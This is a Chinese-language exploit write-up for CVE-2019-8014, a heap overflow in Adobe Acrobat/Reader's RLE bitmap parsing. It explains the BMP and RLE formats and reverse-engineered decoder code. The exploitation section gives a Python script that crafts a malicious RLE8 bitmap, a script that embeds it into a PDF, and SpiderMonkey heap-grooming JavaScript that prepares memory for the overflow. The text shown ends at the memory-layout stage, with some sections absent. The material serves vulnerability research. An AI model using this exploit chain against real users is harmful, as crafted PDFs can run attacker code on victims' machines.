0x01。介绍

Adobe 于8月在APSB19-41中发布了Adobe Acrobat和Reader的安全更新。与往常一样，更新中修复了许多漏洞。当我查看有关ZDI的相应咨询时，我的注意力被其中之一吸引：ZDI-19-725 / CVE-2019-8014。以下文本是此案例的标题和描述：

Adobe Acrobat Pro DC AcroForm位图文件分析基于堆的缓冲区溢出远程执行代码漏洞

特定缺陷存在于BMP图像的行程编码解析中。该问题是由于在将用户提供的数据复制到固定长度的基于堆的缓冲区之前，缺乏对数据长度的正确验证。攻击者可以利用此漏洞在当前进程的上下文中执行代码。

最让我惊讶的是，该缺陷存在于BMP图像的运行长度编码的解析中，因为我记得六年前在Adobe Reader中修复了类似的情况CVE-2013-2729。如果您同样想知道CVE-2013-2729和CVE-2019-8014之间是什么关系，那么让我为您揭露真相。

0x03。位图结构

同样，在深入研究漏洞的细节之前，让我们学习位图图像的一些基本概念。如果您已经熟悉此部分，则可以跳过此部分。

3.1结构

一般来说，位图图像由四个部分组成：

  1. 位图文件头

  2. 位图信息标题

  3. RGBQUAD阵列

  4. 位图数据

3.1.1位图文件头

该BITMAPFILEHEADER结构包含有关位图文件的类型，大小和布局信息。以下是此结构的定义：

typedef struct tagBITMAPFILEHEADER {
  WORD  bfType;         // 'BM'
  DWORD bfSize;         // size of the bitmap file
  WORD  bfReserved1;    // 0
  WORD  bfReserved2;    // 0
  DWORD bfOffBits;      // offset of the bitmap bits
} BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;

3.1.2位图信息标题

该BITMAPINFOHEADER结构包含位图文件的尺寸和颜色格式的信息。以下是此结构的定义：

typedef struct tagBITMAPINFOHEADER {
  DWORD biSize;             // sizeof(BITMAPINFOHEADER)
  LONG  biWidth;            // bitmap width
  LONG  biHeight;           // bitmap height
  WORD  biPlanes;           // must be 1
  WORD  biBitCount;         // bits per pixel
  DWORD biCompression;      // compression method
  DWORD biSizeImage;        // size of bitmap bits
  LONG  biXPelsPerMeter;    // horizontal resolution, pixels-per-meter
  LONG  biYPelsPerMeter;    // vertical resolution, pixels-per-meter
  DWORD biClrUsed;          // number of color indexes in the color table
  DWORD biClrImportant;     // number of color indexes that are required
} BITMAPINFOHEADER, *PBITMAPINFOHEADER;

的值biCompression表示位图的压缩方法。以下是一些可能的值：

#define BI_RGB  0  // uncompressed format
#define BI_RLE8 1  // run-length encoded (RLE) format with 8 bpp
#define BI_RLE4 2  // run-length encoded (RLE) format with 4 bpp
// other compression methods...

3.1.3 RGBQUAD阵列

该RGBQUAD结构描述了由红色，绿色和蓝色相对强度的颜色。以下是此结构的定义：

typedef struct tagRGBQUAD {
  BYTE rgbBlue;
  BYTE rgbGreen;
  BYTE rgbRed;
  BYTE rgbReserved;
} RGBQUAD;

RGBQUAD数组的元素组成颜色表。数组中的条目数取决于BITMAPINFOHEADER结构的biBitCount和biClrUsed成员的值。

3.1.4位图数据

位图的位数据。本节的布局取决于位图的压缩方法。

应该注意的一件事是，通常像素是“自下而上”存储的，从左下角开始，从左到右，然后从图像的底部到顶部逐行（维基百科）。

3.2游程编码

位图文件中可以使用两种游程长度编码方法：RLE4和RLE8。

3.2.1 RLE8

RLE8压缩算法用于压缩8位位图。此格式指定编码模式和绝对模式，并且任何一种模式都可以出现在给定位图中的任何位置。

编码模式涉及两个字节：

  • 如果一对的第一个字节大于零，则使用第二个字节中包含的颜色索引指定要绘制的连续像素数。


  • 如果一对的第一个字节为零，第二个字节为0x02或更小，则第二个字节是一个转义值，可以表示行的结尾，位图的结尾或相对像素位置，如下所示。

    • 0x00 –行尾

    • 0x01 –位图结束

    • 0x02 – Delta

当指定增量时，转义值后的2个字节包含无符号值，这些值指示下一个像素相对于当前位置的水平和垂直偏移。

在绝对模式下，第一个字节为零，第二个字节为0x03至0xFF范围内的值。第二个字节表示随后的字节数，每个字节包含单个像素的颜色索引。在绝对模式下，每次运行都在单词边界上对齐。

下面的示例显示8位压缩位图的十六进制内容：

[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]
[02 78] [00 00] [09 1E] [00 01]

位图扩展如下（两位数值代表单个像素的颜色索引）：

04 04 04
06 06 06 06 06
45 56 67
78 78
move current position 5 right and 1 up
78 78
end of line
1E 1E 1E 1E 1E 1E 1E 1E 1E
end of RLE bitmap

3.2.2 RLE4

RLE4压缩算法用于压缩4位位图。此格式指定编码模式和绝对模式，并且任何一种模式都可以出现在给定位图中的任何位置。

编码模式涉及两个字节。如果一对的第一个字节大于零，则使用第二个字节的高位和低位中包含的两个颜色索引指定要绘制的连续像素数。

使用高4位指定的颜色绘制第一个像素，使用低4位指定的颜色绘制第二个像素，使用高4位指定的颜色绘制第三个像素，依此类推，直到绘制了第一个字节指定的所有像素。

如果一对的第一个字节为零，第二个字节为0x02或更小，则第二个字节是一个转义值，可以表示行的结尾，位图的结尾或相对像素位置，如下所示。

  • 0x00 –行尾

  • 0x01 –位图结束

  • 0x02 – Delta

当指定增量时，转义值后的2个字节包含无符号值，这些值指示下一个像素相对于当前位置的水平和垂直偏移。

在绝对模式下，第一个字节为零，第二个字节为0x03至0xFF范围内的值。第二个字节包含随后的4位颜色索引数。随后的字节在其高阶和低阶4位中包含颜色索引，每个像素一个颜色索引。在绝对模式下，每次运行都在单词边界上对齐。

下面的示例显示4位压缩位图的十六进制内容：

[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]
[04 78] [00 00] [09 1E] [00 01]

位图扩展如下：

0 4 0
0 6 0 6 0
4 5 5 6 6 7
7 8 7 8
move current position 5 right and 1 up
7 8 7 8
end of line
1 E 1 E 1 E 1 E 1
end of RLE bitmap

4.2.2 RLE4解码

接下来的伪代码（也是从function中提取的sub_20CF3E5F）负责解析RLE4压缩数据。解码过程几乎相同，但是它比RLE8复杂一点，因为数据单元不是字节。

if ( bmih.biCompression == 2 )  // RLE4 algorithm
{
  xpos = 0;                     // unsigned int, from left to right
  ypos = bmih.biHeight - 1;     // unsigned int, from bottom to top
  bitmap_ends = 0;
  odd_index_ = 0;
  if ( !fn_feof(v1[2]) )
  {
    do
    {
      if ( bitmap_ends )
        return result;
      fn_read_bytes(v1[2], &cmd, 2u);       // read 2 bytes
      if ( (_BYTE)cmd )                     // first byte != 0
      {                                     // means have compressed data
        high_4bits = BYTE1(cmd) >> 4;       // high-order 4 bits
        low_4bits = BYTE1(cmd) & 0xF;       // low-order 4 bits
        // 20CF45F8, this basic block was patched in the updated binary file
        if ( ypos >= height || (unsigned __int8)cmd + xpos > width )
          goto LABEL_170;                   // CxxThrowException
        index = 0;
        if ( (_BYTE)cmd )
        {
          xpos_ = odd_index_;
          do
          {
            byte_slot = xpos_ >> 1;
            odd_index = index & 1;
            line = fn_get_scanline(v1[3], ypos);
            _4bits = high_4bits;            // even index -> high-order 4 bits
            if ( odd_index )                // odd index -> low-order 4 bits
              _4bits = low_4bits;
            if ( xpos_ & 1 )                // odd xpos, old byte
            {
              line[byte_slot] |= _4bits;
            }
            else                            // even xpos, new byte
            {
              line[byte_slot] = 16 * _4bits;
            }
            ++xpos_;
            index = index + 1;
          }
          while ( index < (unsigned __int8)cmd );
          odd_index_ = xpos_;
          xpos = odd_index_;
        }
      }
      else if ( BYTE1(cmd) )                // first byte = 0, second byte != 0
      {
        if ( BYTE1(cmd) == 1 )              // end of bitmap
        {
          bitmap_ends = 1;
        }
        else if ( BYTE1(cmd) == 2 )         // delta
        {
          fn_read_bytes((_DWORD *)v1[2], &xdelta, 1u);
          fn_read_bytes((_DWORD *)v1[2], &ydelta, 1u);
          xpos += xdelta;                   // move to right
          ypos -= ydelta;                   // move to up
          odd_index_ = xpos;
        }
        else
        {
          // 20CF44EA, this basic block was patched in the updated binary file
          if ( ypos >= height || BYTE1(cmd) + xpos > width )
            goto LABEL_170;                 // CxxThrowException
          index = 0;
          odd_index = 0;
          if ( BYTE1(cmd) )                 // uncompressed data
          {
            xpos_ = odd_index_;
            do
            {
              odd_index_ = index & 1;
              if ( !(index & 1) )           // read 1 byte data
              {
                fn_read_bytes((_DWORD *)v1[2], &value, 1u);
                low_4bits_ = value & 0xF;   // low-order 4 bits
                high_4bits_ = value >> 4;   // high-order 4 bits
              }
              byte_slot = xpos_ >> 1;
              line = fn_get_scanline(v1[3], ypos);
              _4bits = high_4bits_;
              if ( odd_index_ )
                _4bits = low_4bits_;
              if ( xpos_ & 1 )
              {
                line[byte_slot] |= _4bits;
              }
              else
              {
                line[byte_slot] = 16 * _4bits;
              }
              ++xpos_;
              count = BYTE1(cmd);
              not_ended = odd_index++ + 1 < BYTE1(cmd);
              index = odd_index;
            }
            while ( not_ended );
            odd_index_ = xpos_;
            xpos = odd_index_;
          }
          if ( (count & 3u) - 1 <= 1 )      // alignment
            fn_read_bytes(v1[2], &value, 1u);
        }
      }
      else                                  // end of line
      {
        --ypos;                             // move to next line
        xpos = 0;
        odd_index_ = 0;
      }
      result = fn_feof((_DWORD *)v1[2]);
    }
    while ( !result );
  }
}

0x05。利用

5.1溢出候选

在函数中发现了三个整数溢出。在这里，我们将选择处理RLE8数据中的一种。它比其他漏洞利用更加友好。

在RLE4数据解码方面，将数据放入扫描线时将xpos除以的值2。扫描线的最大偏移值为0xFFFFFFFF / 2 = 0x7FFFFFFF，这意味着我们只能向前写入，而我们试图写入的地址可能超出了我们的控制范围。

对于RLE8数据解码，扫描线的偏移值是xpos其自身，因此我们可以向后写入并且可以控制距离。在以下if语句中，的最大值(unsigned __int8)cmd为0xFF。和旁路支票，的最小值xpos就是0xFFFFFF01它应该是-255在signed int形式。换句话说，我们可以向后写入多达0xFF字节的数据。

// 20CF440F, this basic block was patched in the updated binary file
if ( ypos >= height || (unsigned __int8)cmd + xpos > width )
  goto LABEL_170;                       // CxxThrowException

但是，我们尝试写入的间隔只能填充相同的值。这将在编写漏洞利用程序时引起一些问题，稍后将进行说明。

index = 0;
do
{
  line = (_BYTE *)fn_get_scanline(v1[3], ypos);
  line[xpos++] = BYTE1(cmd);
  ++index;
}
while ( index < (unsigned __int8)cmd );

5.2 SpiderMonkey概念

Adobe Reader使用SpiderMonkey作为其JavaScript引擎。在编写漏洞之前，让我们学习有关SpiderMonkey引擎的一些基本知识。

5.2.1 ARRAYBUFFER

当的值byteLength大于时0x68，将从系统堆（通过）分配ArrayBuffer对象的后备存储ucrtbase!calloc，否则将从SpiderMonkey的有期堆分配。同样，从系统堆进行分配时，基础堆缓冲区将大一些0x10字节以存储ObjectElements对象。

class ObjectElements {
 public:
  uint32_t flags;               // can be any value, default is 0
  uint32_t initializedLength;   // byteLength
  uint32_t capacity;            // pointer of associated view object
  uint32_t length;              // can be any value, default is 0
 // ......
};

中的成员名称对ObjectElements没有意义ArrayBuffer。在这里，第二个成员保存byteLength值，第三个成员保存关联的DataView对象的指针。其他成员的值没有意义，可以是任何数字。

var ab = new ArrayBuffer(0x70);

5.3位图构造

以下python代码可用于生成RLE压缩的位图图像。

#!/usr/bin/env python
#-*- coding:utf-8 -*-
import os
import sys
import struct

RLE8 = 1
RLE4 = 2
COMPRESSION = RLE8
BIT_COUNT = 8
CLR_USED = 1 << BIT_COUNT
WIDTH = 0xF0
HEIGHT = 1

def get_bitmap_file_header(file_size, bits_offset):
    return struct.pack('<2sIHHI', 'BM', file_size, 0, 0, bits_offset)

def get_bitmap_info_header(data_size):
    return struct.pack('<IIIHHIIIIII',
        0x00000028,
        WIDTH,
        HEIGHT,
        0x0001,
        BIT_COUNT,
        COMPRESSION,
        data_size,
        0x00000000,
        0x00000000,
        CLR_USED,
        0x00000000)

def get_bitmap_info_colors():
    # B, G, R, Reserved
    rgb_quad = '\x00\x00\xFF\x00'
    return rgb_quad * CLR_USED

def get_bitmap_data():
    # set ypos to 0 so that we'll be at the beginning of the heap buffer
    # ypos = (HEIGHT - 1) = 0, no need to bother

    # set xpos to 0xFFFFFF00
    data = '\x00\x02\xFF\x00' * (0xFFFFFF00 / 0xFF)
    # set xpos to 0xFFFFFF0C
    data += '\x00\x02\x0C\x00'

    # 0xFFFFFF0C + 0xF4 = 0
    # 0xF4 bytes of 0x10
    data += '\xF4\x10'

    # mark end of bitmap to skip CxxThrowException
    data += '\x00\x01'

    return data

def generate_bitmap(filepath):
    data = get_bitmap_data()
    data_size = len(data)

    bmi_header = get_bitmap_info_header(data_size)
    bmi_colors = get_bitmap_info_colors()

    bmf_header_size = 0x0E
    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)
    file_size = bits_offset + data_size
    bmf_header = get_bitmap_file_header(file_size, bits_offset)
    with open(filepath, 'wb') as f:
        f.write(bmf_header)
        f.write(bmi_header)
        f.write(bmi_colors)
        f.write(data)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'Usage: %s <output.bmp>' % os.path.basename(sys.argv[0])
        sys.exit(1)
    generate_bitmap(sys.argv[1])

在这里，我们将使用以下参数生成RLE8位图：

  • 宽度为 0xF0

  • 高度为 1

  • 位数是 8

在这里，堆缓冲区的大小将是0xF0，我们将能够0xF4使用value向后写入字节0x10。

#!/usr/bin/env python
#-*- coding:utf-8 -*-
import os
import sys
import zlib
import base64

def parse_template(template_path):
    with open(template_path, 'rb') as f:
        data = f.read()
    xdp_begin = data.find('<xdp:xdp')
    xdp_end = data.find('</xdp:xdp>') + len('</xdp:xdp>')

    part1 = data[:xdp_begin]
    part2 = data[xdp_begin:xdp_end]
    part3 = data[xdp_end:]
    return part1, part2, part3

def generate_pdf(image_path, template_path, pdf_path):
    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)

    with open(image_path, 'rb') as f:
        image_data = base64.b64encode(f.read())
    pdf_part2 = pdf_part2.replace('__IMAGE_BASE64_DATA__', image_data)
    pdf_part2 = zlib.compress(pdf_part2)

    pdf_part1 = pdf_part1.replace('__STREAM_LENGTH__', '%d' % len(pdf_part2))

    pdf_data = pdf_part1 + pdf_part2 + pdf_part3
    pdf_data = pdf_data.replace('__XREF_OFFSET__', '%d' % pdf_data.find('xref'))

    with open(pdf_path, 'wb') as f:
        f.write(pdf_data)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        filename = os.path.basename(sys.argv[0])
        print 'Usage: %s <input.bmp> <template.pdf> <output.pdf>' % filename
        sys.exit(1)
    generate_pdf(sys.argv[1], sys.argv[2], sys.argv[3])

5.5.2内存布局（0）

如果我们可以使0x10101010行为像一个有效的指针，就可以避免崩溃。显然，我们应该在触发漏洞之前安排内存布局。为了使其更稳定，甚至应该在创建和释放ArrayBuffer对象之前完成。

我们需要能够将任何值放入任何内存地址，例如0x10101010。为了实现此目标，我们可以创建许多ArrayBuffer对象，并将其byteLength设置为0xFFE8。这是一个谨慎选择的大小，以确保将ArrayBuffer对象分配到可预测的地址。

// 0xFFE8 -> byteLength
// 0x10 -> sizeof ObjectElements
// 0x08 -> sizeof heap block's metadata
0xFFE8 + 0x10 + 0x08 = 0x10000

我不会详细讨论如何避免崩溃，很容易找出具体情况。以下代码可用于避免崩溃。

function fillHeap() {
    var array = new Array(0x1200);
    array[0] = new ArrayBuffer(0xFFE8);
    var dv = new DataView(array[0]);

    dv.setUint32(0xFB8, 0x10100058, true);
    dv.setUint32(0, 0x10100158, true);
    dv.setUint32(0xFFA8, 0x10100258, true);
    dv.setUint32(0x200 + 0x14, 0x10100358, true);

    for (var i = 1; i < array.length; ++i) {
        array[i] = array[0].slice();
    }
    return array;
}

还没完成 当我们尝试为其创建新DataView对象时，该过程仍然崩溃。我们可以使用相同的技巧来避免崩溃。以下是改进的代码。

function fillHeap() {
    var array = new Array(0x1200);
    array[0] = new ArrayBuffer(0xFFE8);
    var dv = new DataView(array[0]);
    // avoid crash when triggering the vulnerability
    dv.setUint32(0xFB8, 0x10100058, true);
    dv.setUint32(0, 0x10100158, true);
    dv.setUint32(0xFFA8, 0x10100258, true);
    dv.setUint32(0x200 + 0x14, 0x10100358, true);
    // avoid crash when creating new DataView objects
    dv.setUint32(0xFFA4, 0x10100458, true);

    for (var i = 1; i < array.length; ++i) {
        array[i] = array[0].slice();
    }
    return array;
}
